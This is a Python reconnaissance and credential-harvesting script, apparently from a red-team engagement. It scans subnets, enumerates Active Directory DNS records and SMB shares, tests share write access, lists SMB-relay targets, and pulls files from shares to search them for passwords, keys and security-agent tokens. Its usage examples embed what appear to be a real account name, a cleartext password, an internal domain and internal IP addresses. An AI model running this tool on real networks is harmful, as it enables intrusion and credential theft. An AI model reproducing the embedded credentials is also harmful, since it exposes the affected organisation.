#!/usr/bin/env python3
"""
Network Discovery & Enumeration Tool v2.0
Covers Days 4-5 of the engagement playbook:
 - Ping sweep / host discovery
 - Port scanning with service identification and banner grabbing
 - DNS SRV enumeration (LDAP, Kerberos, MSSQL, GC, Exchange, KMS)
 - SMB share enumeration with read/write access testing
 - SMB signing check (relay target identification)
 - OS detection via SMB
 - Recursive file listing with interesting file detection
 - Credential/sensitive data search in accessible files
 - Report generation (text + JSON)

Dependencies: impacket (installed via pip)
"""
import socket
import sys
import os
import re
import struct
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO

try:
    from impacket.smbconnection import SMBConnection
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    print("[!] impacket not installed, SMB enumeration disabled")

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False
    print("[!] dnspython not installed, using socket fallback for DNS")

PORTS = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",88:"Kerberos",110:"POP3",111:"RPCBind",135:"RPC/MSRPC",139:"NetBIOS-SSN",143:"IMAP",389:"LDAP",443:"HTTPS",445:"SMB",464:"Kerberos-Pwd",587:"SMTP-Sub",593:"HTTP-RPC",636:"LDAPS",993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"Oracle",2049:"NFS",3050:"Firebird",3268:"GC-LDAP",3269:"GC-LDAPS",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5985:"WinRM-HTTP",5986:"WinRM-HTTPS",8080:"HTTP-Proxy",8443:"HTTPS-Alt",8888:"HTTP-Alt",9389:"AD-Web-Svc",27017:"MongoDB"}
QUICK_PORTS = {88:"Kerberos",135:"RPC",389:"LDAP",445:"SMB",1433:"MSSQL",3050:"Firebird",3306:"MySQL",3389:"RDP",5985:"WinRM",5432:"PostgreSQL",8080:"HTTP-Proxy",443:"HTTPS",80:"HTTP"}

SENSITIVE_PATTERNS = [
    (re.compile(r'password\s*[=:]', re.I), 'PASSWORD'),
    (re.compile(r'passwd\s*[=:]', re.I), 'PASSWORD'),
    (re.compile(r'pwd\s*[=:]', re.I), 'PASSWORD'),
    (re.compile(r'cpassword\s*=', re.I), 'GPP_PASSWORD'),
    (re.compile(r'credential', re.I), 'CREDENTIAL'),
    (re.compile(r'apikey\s*[=:]', re.I), 'API_KEY'),
    (re.compile(r'api_key\s*[=:]', re.I), 'API_KEY'),
    (re.compile(r'token\s*[=:]', re.I), 'TOKEN'),
    (re.compile(r'secret\s*[=:]', re.I), 'SECRET'),
    (re.compile(r'connectionstring\s*[=:]', re.I), 'CONN_STRING'),
    (re.compile(r'server\s*=.*password\s*=', re.I), 'CONN_STRING'),
    (re.compile(r'net use.*\/user:', re.I), 'NET_USE'),
    (re.compile(r'runas\s+\/user:', re.I), 'RUNAS'),
    (re.compile(r'DefaultPassword', re.I), 'AUTOLOGON'),
    (re.compile(r'AdminPassword', re.I), 'ADMIN_PWD'),
    (re.compile(r'AutoAdminLogon', re.I), 'AUTOLOGON'),
    (re.compile(r'CID\s*=', re.I), 'CROWDSTRIKE_CID'),
    (re.compile(r'POLICYTOKEN\s*=', re.I), 'ZSCALER_TOKEN'),
    (re.compile(r'ProxyServer\s*=', re.I), 'PROXY_CONFIG'),
    (re.compile(r'BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY', re.I), 'PRIVATE_KEY'),
    (re.compile(r'BEGIN CERTIFICATE', re.I), 'CERTIFICATE'),
    (re.compile(r'ConvertTo-SecureString', re.I), 'SECURE_STRING'),
    (re.compile(r'-EncodedCommand', re.I), 'ENCODED_CMD'),
    (re.compile(r'FromBase64String', re.I), 'BASE64_DECODE'),
    (re.compile(r'powershell\s+-[eE]', re.I), 'ENCODED_PS'),
    (re.compile(r'New-Object.*PSCredential', re.I), 'PS_CREDENTIAL'),
]

FP_KEYWORDS = ['passwordpolicy','passwordexpir','passwordage','passwordhist','minimumpassword','maximumpassword','passwordneverexpires','passwordlastset','passwordnotrequired','passwordcomplexity','passwordreversible','mustchangepassword','# password','// password','rem password','enter password','type password','your password','forgot password','reset password','change password','<password>','</password>']

INTERESTING_FILENAMES = ['cred','pass','secret','token','key','config','backup','credential','login','account','auth','private','cert','deploy','install','setup','admin','database','connection','web.config','app.config','appsettings','id_rsa','id_dsa','.pfx','.p12','.pem','.key','.cer','.crt','.env','unattend','sysprep','autologon']
SCRIPT_EXTENSIONS = ['.bat','.cmd','.ps1','.psm1','.psd1','.vbs','.vbe','.js','.jse','.wsf','.wsh','.xml','.ini','.txt','.cfg','.conf','.reg','.config','.py','.csv','.log','.sql','.properties','.yaml','.yml','.json','.toml','.env','.inf']

DNS_SRV_RECORDS = [
    ('_ldap._tcp.dc._msdcs','Domain Controllers (LDAP)'),
    ('_kerberos._tcp','Kerberos KDC'),
    ('_kpasswd._tcp','Kerberos Password Change'),
    ('_gc._tcp','Global Catalog'),
    ('_ldap._tcp.pdc._msdcs','PDC Emulator'),
    ('_mssql._tcp','MSSQL Servers'),
    ('_http._tcp','HTTP Services'),
    ('_autodiscover._tcp','Exchange Autodiscover'),
    ('_vlmcs._tcp','KMS Server'),
    ('_sip._tcp','SIP Services'),
    ('_sipfederationtls._tcp','SIP Federation'),
]

class Scanner:
    def __init__(self, timeout=2, workers=30, verbose=False):
        self.timeout=timeout; self.workers=workers; self.verbose=verbose
        self.results={}; self.dns_results={}; self.smb_info={}
        self.shares_found=[]; self.creds_found=[]; self.relay_targets=[]
        self.interesting_files=[]; self.output_lines=[]
        self.stats={'hosts_scanned':0,'hosts_alive':0,'ports_open':0,'shares_found':0,'files_scanned':0,'creds_found':0}

    def log(self, msg, level='INFO'):
        line=f"[{datetime.now().strftime('%H:%M:%S')}][{level}] {msg}"
        print(line, flush=True); self.output_lines.append(line)

    def log_finding(self, msg): self.log(msg, 'FINDING')

    # DNS
    def dns_enum(self, domain):
        self.log(f"\n{'='*60}"); self.log(f"PHASE 0: DNS SRV Enumeration - {domain}"); self.log('='*60)
        for srv, desc in DNS_SRV_RECORDS:
            fqdn=f"{srv}.{domain}"
            try:
                entries=[]
                if HAS_DNS:
                    answers=dns.resolver.resolve(fqdn, 'SRV')
                    for r in answers:
                        entries.append(str(r.target).rstrip('.'))
                else:
                    # Pure socket fallback using DNS wire protocol
                    entries=self._dns_srv_query(fqdn)
                if entries:
                    self.dns_results[desc]=entries
                    self.log(f"  {desc}:")
                    for e in entries:
                        ip=self._resolve(e)
                        ip_str=f" -> {ip}" if ip else ""
                        self.log(f"    {e}{ip_str}")
                elif self.verbose: self.log(f"  {desc}: No records")
            except: pass

    def _dns_srv_query(self, fqdn):
        """Pure socket DNS SRV query - no external process needed"""
        entries=[]
        try:
            # Build DNS query packet
            txid=os.urandom(2)
            flags=b'\x01\x00' # standard query, recursion desired
            qdcount=b'\x00\x01'; ancount=b'\x00\x00'; nscount=b'\x00\x00'; arcount=b'\x00\x00'
            # Encode QNAME
            qname=b''
            for part in fqdn.split('.'):
                qname+=bytes([len(part)])+part.encode()
            qname+=b'\x00'
            qtype=b'\x00\x21' # SRV
            qclass=b'\x00\x01' # IN
            packet=txid+flags+qdcount+ancount+nscount+arcount+qname+qtype+qclass
            # Get DNS server from system
            dns_server=None
            try:
                import winreg
                key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces')
                for i in range(256):
                    try:
                        subkey_name=winreg.EnumKey(key,i)
                        subkey=winreg.OpenKey(key,subkey_name)
                        try:
                            ns,_=winreg.QueryValueEx(subkey,'DhcpNameServer')
                            if ns: dns_server=ns.split()[0]; break
                        except: pass
                        try:
                            ns,_=winreg.QueryValueEx(subkey,'NameServer')
                            if ns: dns_server=ns.split(',')[0]; break
                        except: pass
                    except: break
            except:
                dns_server='10.46.181.14' # fallback to known DC
            if not dns_server: dns_server='10.46.181.14'
            # Send UDP query
            s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.sendto(packet,(dns_server,53))
            resp,_=s.recvfrom(4096)
            s.close()
            # Parse response - skip header (12 bytes) and question section
            pos=12
            while resp[pos]!=0: pos+=resp[pos]+1
            pos+=5 # null byte + qtype + qclass
            # Parse answers
            ancount_val=struct.unpack('!H',resp[4:6])[0]
            for _ in range(ancount_val):
                # Skip name (could be pointer)
                if resp[pos]&0xC0==0xC0: pos+=2
                else:
                    while resp[pos]!=0: pos+=resp[pos]+1
                    pos+=1
                rtype=struct.unpack('!H',resp[pos:pos+2])[0]; pos+=2
                pos+=2 # class
                pos+=4 # ttl
                rdlen=struct.unpack('!H',resp[pos:pos+2])[0]; pos+=2
                if rtype==33: # SRV
                    pos+=6 # priority, weight, port
                    # Read target name
                    name=''
                    tpos=pos
                    while resp[tpos]!=0:
                        if resp[tpos]&0xC0==0xC0:
                            ptr=struct.unpack('!H',resp[tpos:tpos+2])[0]&0x3FFF
                            while resp[ptr]!=0:
                                l=resp[ptr]; ptr+=1
                                name+=resp[ptr:ptr+l].decode()+'.'; ptr+=l
                            break
                        else:
                            l=resp[tpos]; tpos+=1
                            name+=resp[tpos:tpos+l].decode()+'.'; tpos+=l
                    entries.append(name.rstrip('.'))
                    pos+=rdlen-6
                else:
                    pos+=rdlen
        except: pass
        return entries

    def _resolve(self, hostname):
        """Resolve hostname to IP using pure Python"""
        try:
            if HAS_DNS:
                answers=dns.resolver.resolve(hostname, 'A')
                for r in answers:
                    ip=str(r)
                    if not ip.startswith(('10.46.181.14','10.71.181.14')): return ip
            else:
                ip=socket.gethostbyname(hostname)
                if not ip.startswith(('10.46.181.14','10.71.181.14')): return ip
        except: pass
        return None

    # Port Scanning
    def _scan_port(self, ip, port):
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(self.timeout)
            r=s.connect_ex((ip, port)); s.close(); return r==0
        except: return False

    def _grab_banner(self, ip, port):
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(self.timeout); s.connect((ip, port))
            if port in [80,8080,443,8443]: s.send(b'HEAD / HTTP/1.0\r\nHost: '+ip.encode()+b'\r\n\r\n')
            else: s.send(b'\r\n')
            b=s.recv(1024).decode('utf-8',errors='ignore').strip(); s.close(); return b[:200] if b else None
        except: return None

    def _resolve_hostname(self, ip):
        """Reverse DNS lookup using pure Python"""
        try:
            if HAS_DNS:
                rev=dns.reversename.from_address(ip)
                answers=dns.resolver.resolve(rev, 'PTR')
                for r in answers:
                    return str(r).rstrip('.')
            else:
                hostname,_,_=socket.gethostbyaddr(ip)
                return hostname
        except: pass
        return None

    def _scan_host(self, ip, port_list):
        open_ports=[]; banners={}
        for port, name in port_list.items():
            if self._scan_port(ip, port):
                open_ports.append((port, name)); self.stats['ports_open']+=1
                if port in [21,22,25,80,443,8080,1433,3306]:
                    b=self._grab_banner(ip, port)
                    if b: banners[port]=b
        return ip, open_ports, banners

    def discover_subnet(self, subnet, quick=False):
        base='.'.join(subnet.split('.')[:3]); pl=QUICK_PORTS if quick else PORTS
        self.log(f"\n{'='*60}"); self.log(f"PHASE 1: Host Discovery - {subnet} ({len(pl)} ports)"); self.log('='*60)
        targets=[f"{base}.{i}" for i in range(1,255)]; self.stats['hosts_scanned']=len(targets)
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futures={ex.submit(self._scan_host, ip, pl): ip for ip in targets}
            for f in as_completed(futures):
                ip, ports, banners=f.result()
                if ports:
                    hn=self._resolve_hostname(ip)
                    self.results[ip]={'ports':ports,'banners':banners,'hostname':hn}; self.stats['hosts_alive']+=1
                    h=f"{ip} ({hn})" if hn else ip; ps=', '.join([f"{p}({n})" for p,n in ports])
                    self.log(f"  [LIVE] {h} -> {ps}")
                    for port, banner in banners.items(): self.log(f"    Banner [{port}]: {banner[:100]}")
        self.log(f"  Total: {self.stats['hosts_alive']} alive / {self.stats['hosts_scanned']} scanned")

    def scan_targets(self, targets, quick=False):
        pl=QUICK_PORTS if quick else PORTS
        self.log(f"\n{'='*60}"); self.log(f"PHASE 1: Port Scan - {len(targets)} targets ({len(pl)} ports)"); self.log('='*60)
        self.stats['hosts_scanned']=len(targets)
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futures={ex.submit(self._scan_host, ip, pl): ip for ip in targets}
            for f in as_completed(futures):
                ip, ports, banners=f.result()
                if ports:
                    hn=self._resolve_hostname(ip)
                    self.results[ip]={'ports':ports,'banners':banners,'hostname':hn}; self.stats['hosts_alive']+=1
                    h=f"{ip} ({hn})" if hn else ip; ps=', '.join([f"{p}({n})" for p,n in ports])
                    self.log(f"  [LIVE] {h} -> {ps}")
                    for port, banner in banners.items(): self.log(f"    Banner [{port}]: {banner[:100]}")
        self.log(f"  Total: {self.stats['hosts_alive']} alive / {self.stats['hosts_scanned']} scanned")

    # SMB
    def _get_smb_info(self, ip, user, pwd, dom):
        info={}
        try:
            c=SMBConnection(ip, ip, timeout=self.timeout); c.login(user, pwd, dom)
            info['os']=c.getServerOS(); info['hostname']=c.getServerName()
            info['domain']=c.getServerDNSDomainName(); info['signing']=c.isSigningRequired()
            if not info['signing']:
                self.relay_targets.append(ip)
                self.log_finding(f"  [RELAY TARGET] {ip} - SMB Signing NOT required!")
            self.log(f"  OS: {info.get('os','N/A')} | Host: {info.get('hostname','N/A')} | Signing: {'Yes' if info.get('signing') else 'NO'}")
            c.logoff()
        except Exception as e:
            if self.verbose: self.log(f"  SMB info error: {e}", 'ERROR')
        return info

    def enum_shares(self, ip, user, pwd, dom):
        if not HAS_IMPACKET: return []
        shares=[]
        try:
            c=SMBConnection(ip, ip, timeout=self.timeout); c.login(user, pwd, dom)
            for s in c.listShares():
                name=s['shi1_netname'][:-1]; remark=s['shi1_remark'][:-1] if s['shi1_remark'] else ''
                si={'name':name,'remark':remark,'readable':False,'writable':False}
                try: c.listPath(name,'\\*'); si['readable']=True
                except: pass
                try:
                    tf=f'\\test_{datetime.now().strftime("%H%M%S")}.tmp'
                    c.putFile(name, tf, BytesIO(b'test').read); c.deleteFile(name, tf); si['writable']=True
                except: pass
                shares.append(si); self.shares_found.append(f"\\\\{ip}\\{name}"); self.stats['shares_found']+=1
                acc=[]
                if si['readable']: acc.append('READ')
                if si['writable']: acc.append('WRITE')
                acc_str=','.join(acc) if acc else 'NO ACCESS'
                self.log(f"  [SHARE] \\\\{ip}\\{name} [{acc_str}] {remark}")
                if si['writable']: self.log_finding(f"  [!] WRITABLE: \\\\{ip}\\{name}")
            c.logoff()
        except Exception as e:
            if self.verbose: self.log(f"  Share enum error: {e}", 'ERROR')
        return shares

    def enum_all_shares(self, user, pwd, dom):
        self.log(f"\n{'='*60}"); self.log("PHASE 2: SMB Enumeration"); self.log('='*60)
        hosts=[ip for ip,d in self.results.items() if any(p==445 for p,_ in d['ports'])]
        for ip in sorted(hosts):
            hn=self.results[ip].get('hostname',''); h=f"{ip} ({hn})" if hn else ip
            self.log(f"\n  --- {h} ---")
            self.smb_info[ip]=self._get_smb_info(ip, user, pwd, dom)
            self.enum_shares(ip, user, pwd, dom)

    # Deep Scan
    def _recursive_list(self, c, share, path, depth, max_d, results):
        if depth>=max_d: return
        try:
            search=path+'\\*' if path!='\\' else '\\*'
            for f in c.listPath(share, search):
                fn=f.get_longname()
                if fn in ['.','..']: continue
                fp=f"{path}\\{fn}" if path!='\\' else f"\\{fn}"
                if f.is_directory():
                    self._recursive_list(c, share, fp, depth+1, max_d, results)
                else:
                    sz=f.get_filesize(); ext=os.path.splitext(fn)[1].lower()
                    entry={'path':fp,'name':fn,'size':sz,'ext':ext,'interesting':False}
                    fn_l=fn.lower()
                    if ext in SCRIPT_EXTENSIONS or any(kw in fn_l for kw in INTERESTING_FILENAMES):
                        entry['interesting']=True
                        if any(kw in fn_l for kw in INTERESTING_FILENAMES):
                            self.interesting_files.append(f"\\\\{share}{fp}")
                            self.log_finding(f"    [!] {fp} ({sz} bytes)")
                    results.append(entry)
        except: pass

    def _scan_content(self, c, share, fpath, ip):
        findings=[]
        try:
            buf=BytesIO(); c.getFile(share, fpath, buf.write); content=buf.getvalue()
            if not content: return findings
            text=content.decode('utf-8',errors='ignore')
            for i, line in enumerate(text.split('\n'),1):
                ls=line.strip()
                if not ls: continue
                if any(fp in ls.lower() for fp in FP_KEYWORDS): continue
                for pat, cat in SENSITIVE_PATTERNS:
                    if pat.search(ls):
                        finding={'file':f"\\\\{ip}\\{share}{fpath}",'line_num':i,'line':ls[:300],'category':cat}
                        findings.append(finding); self.creds_found.append(finding); self.stats['creds_found']+=1
                        self.log_finding(f"    [{cat}] {fpath}:{i}")
                        self.log_finding(f"      -> {ls[:200]}")
                        break
            self.stats['files_scanned']+=1
        except: pass
        return findings

    def deep_scan(self, ip, share, user, pwd, dom, depth=3):
        self.log(f"\n  Deep scanning \\\\{ip}\\{share} (depth={depth})...")
        try:
            c=SMBConnection(ip, ip, timeout=5); c.login(user, pwd, dom)
            files=[]
            self._recursive_list(c, share, '\\', 0, depth, files)
            self.log(f"    Files found: {len(files)}")
            scannable=[f for f in files if f['interesting'] and 0<f['size']<2097152]
            self.log(f"    Scanning {len(scannable)} script/config files...")
            for sf in scannable:
                self._scan_content(c, share, sf['path'], ip)
            c.logoff()
        except Exception as e:
            if self.verbose: self.log(f"    Error: {e}", 'ERROR')

    def deep_scan_all(self, user, pwd, dom, depth=3, share_filter=None):
        self.log(f"\n{'='*60}"); self.log("PHASE 3: Deep Credential Scan"); self.log('='*60)
        hosts=[ip for ip,d in self.results.items() if any(p==445 for p,_ in d['ports'])]
        for ip in sorted(hosts):
            hn=self.results[ip].get('hostname',''); h=f"{ip} ({hn})" if hn else ip
            self.log(f"\n  --- {h} ---")
            try:
                c=SMBConnection(ip, ip, timeout=5); c.login(user, pwd, dom)
                for s in c.listShares():
                    name=s['shi1_netname'][:-1]
                    if name.upper()=='IPC$': continue
                    if share_filter and name.upper() not in [x.upper() for x in share_filter]: continue
                    try: c.listPath(name,'\\*')
                    except: continue
                    self.deep_scan(ip, name, user, pwd, dom, depth)
                c.logoff()
            except: pass

    # Reports
    def generate_report(self, filename):
        self.log(f"\n{'='*60}"); self.log(f"GENERATING REPORT: {filename}"); self.log('='*60)
        with open(filename,'w',encoding='utf-8') as f:
            f.write("="*70+"\n  NETWORK DISCOVERY & ENUMERATION REPORT\n")
            f.write(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"+"="*70+"\n\n")

            if self.dns_results:
                f.write("DNS SRV ENUMERATION\n"+"-"*40+"\n")
                for desc, entries in self.dns_results.items():
                    f.write(f"\n  {desc}:\n")
                    for e in entries: f.write(f"    - {e}\n")
                f.write("\n")

            f.write("HOST DISCOVERY\n"+"-"*40+"\n")
            f.write(f"  Scanned: {self.stats['hosts_scanned']} | Alive: {self.stats['hosts_alive']} | Open ports: {self.stats['ports_open']}\n\n")
            for ip in sorted(self.results.keys()):
                d=self.results[ip]; hn=d.get('hostname',''); h=f"{ip} ({hn})" if hn else ip
                f.write(f"  {h}\n")
                for p,n in sorted(d['ports']):
                    b=d['banners'].get(p,''); bs=f" [{b[:80]}]" if b else ''
                    f.write(f"    {p:>5}/{n:<15}{bs}\n")
                if ip in self.smb_info:
                    i=self.smb_info[ip]
                    f.write(f"    SMB: {i.get('os','N/A')} | Signing: {'Yes' if i.get('signing') else 'NO'}\n")
                f.write("\n")

            if self.relay_targets:
                f.write("SMB RELAY TARGETS\n"+"-"*40+"\n")
                for t in self.relay_targets: f.write(f"  {t}\n")
                f.write("\n")

            if self.shares_found:
                f.write("SMB SHARES\n"+"-"*40+"\n")
                for s in sorted(self.shares_found): f.write(f"  {s}\n")
                f.write(f"\n  Total: {len(self.shares_found)}\n\n")

            if self.interesting_files:
                f.write("INTERESTING FILES\n"+"-"*40+"\n")
                for fi in sorted(self.interesting_files): f.write(f"  {fi}\n")
                f.write("\n")

            if self.creds_found:
                f.write("CREDENTIALS / SENSITIVE DATA\n"+"-"*40+"\n")
                for c in self.creds_found:
                    f.write(f"\n  [{c['category']}] {c['file']}:{c['line_num']}\n    {c['line'][:300]}\n")
                f.write(f"\n  Total: {len(self.creds_found)}\n\n")

            f.write("="*70+"\n  SUMMARY\n"+"="*70+"\n")
            for k,v in self.stats.items(): f.write(f"  {k}: {v}\n")
            f.write(f"  relay_targets: {len(self.relay_targets)}\n")

        jf=filename.rsplit('.',1)[0]+'.json'
        with open(jf,'w') as f:
            json.dump({'time':datetime.now().isoformat(),'hosts':{ip:{'hostname':d.get('hostname'),'ports':d['ports'],'smb':self.smb_info.get(ip,{})} for ip,d in self.results.items()},'dns':self.dns_results,'shares':self.shares_found,'relay_targets':self.relay_targets,'credentials':[{'file':c['file'],'line':c['line_num'],'category':c['category'],'content':c['line']} for c in self.creds_found],'stats':self.stats},f,indent=2,default=str)
        self.log(f"  Reports: {filename}, {jf}")

    def save_log(self, filename):
        with open(filename,'w',encoding='utf-8') as f: f.write('\n'.join(self.output_lines))

def usage():
    print("""
Network Scanner v2.0

Usage: scanner.py <mode> [options]

Modes:
  --full              DNS + port scan + SMB enum + deep credential scan
  --discover          Port scan only
  --shares-only       SMB share enumeration only
  --deep-only         Deep credential scan only

Targets:
  --subnet CIDR       Scan subnet (e.g. 172.23.210.0/24)
  --targets IP,IP     Scan specific IPs
  --quick             Quick mode (13 key ports vs 37 full)

Auth:
  --user USER         SMB username
  --pass PASS         SMB password
  --domain DOM        SMB domain

Options:
  --dns-domain FQDN   DNS SRV enum domain
  --shares S1,S2      Limit deep scan to specific shares
  --depth N           Recursion depth (default: 3)
  --output FILE       Save report
  --log FILE          Save full log
  --timeout N         Timeout seconds (default: 2)
  --workers N         Parallel workers (default: 30)
  --verbose           Show errors

Examples:
  Full scan:
    scanner.py --full --targets 172.23.205.32,10.46.181.14 --user b025045796 --pass "Bdo@0421-222" --domain HO --dns-domain HO.AD.BDO --output report.txt

  Quick subnet:
    scanner.py --discover --subnet 172.23.210.0/24 --quick

  Deep SYSVOL scan:
    scanner.py --deep-only --targets 172.23.205.32 --user b025045796 --pass "Bdo@0421-222" --domain HO --shares SYSVOL,NETLOGON --depth 5 --output creds.txt
""")

def main():
    if len(sys.argv)<2: usage(); sys.exit(1)
    a=sys.argv[1:]; mode=None; subnet=None; targets=[]; user=''; pwd=''; dom=''
    dns_dom=None; sf=None; depth=3; output=None; lf=None; to=2; w=30; v=False; q=False
    i=0
    while i<len(a):
        x=a[i]
        if x=='--full': mode='full'; i+=1
        elif x=='--discover': mode='discover'; i+=1
        elif x=='--shares-only': mode='shares'; i+=1
        elif x=='--deep-only': mode='deep'; i+=1
        elif x=='--subnet' and i+1<len(a): subnet=a[i+1]; i+=2
        elif x=='--targets' and i+1<len(a): targets=[t.strip() for t in a[i+1].split(',')]; i+=2
        elif x=='--user' and i+1<len(a): user=a[i+1]; i+=2
        elif x=='--pass' and i+1<len(a): pwd=a[i+1]; i+=2
        elif x=='--domain' and i+1<len(a): dom=a[i+1]; i+=2
        elif x=='--dns-domain' and i+1<len(a): dns_dom=a[i+1]; i+=2
        elif x=='--shares' and i+1<len(a): sf=[s.strip() for s in a[i+1].split(',')]; i+=2
        elif x=='--depth' and i+1<len(a): depth=int(a[i+1]); i+=2
        elif x=='--output' and i+1<len(a): output=a[i+1]; i+=2
        elif x=='--log' and i+1<len(a): lf=a[i+1]; i+=2
        elif x=='--timeout' and i+1<len(a): to=int(a[i+1]); i+=2
        elif x=='--workers' and i+1<len(a): w=int(a[i+1]); i+=2
        elif x=='--verbose': v=True; i+=1
        elif x=='--quick': q=True; i+=1
        elif x in ['-h','--help']: usage(); sys.exit(0)
        else: i+=1

    if not mode: print("Error: specify mode"); usage(); sys.exit(1)

    sc=Scanner(timeout=to, workers=w, verbose=v)
    sc.log(f"\n{'='*60}\n  Network Scanner v2.0 | Mode: {mode.upper()}\n  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*60}")

    if mode=='full' and dns_dom: sc.dns_enum(dns_dom)

    if mode in ['full','discover']:
        if subnet: sc.discover_subnet(subnet, quick=q)
        elif targets: sc.scan_targets(targets, quick=q)
    elif mode in ['shares','deep']:
        if targets:
            for ip in targets: sc.results[ip]={'ports':[(445,'SMB')],'banners':{},'hostname':sc._resolve_hostname(ip)}
        else: print("Need --targets"); sys.exit(1)

    if mode in ['full','shares'] and user: sc.enum_all_shares(user, pwd, dom)
    if mode in ['full','deep'] and user: sc.deep_scan_all(user, pwd, dom, depth, sf)

    if output: sc.generate_report(output)
    if lf: sc.save_log(lf)

    sc.log(f"\n{'='*60}\n  COMPLETE\n{'='*60}")
    sc.log(f"  Hosts: {sc.stats['hosts_alive']} | Ports: {sc.stats['ports_open']} | Shares: {sc.stats['shares_found']}")
    sc.log(f"  Files scanned: {sc.stats['files_scanned']} | Creds found: {sc.stats['creds_found']} | Relay targets: {len(sc.relay_targets)}")

if __name__=='__main__': main()
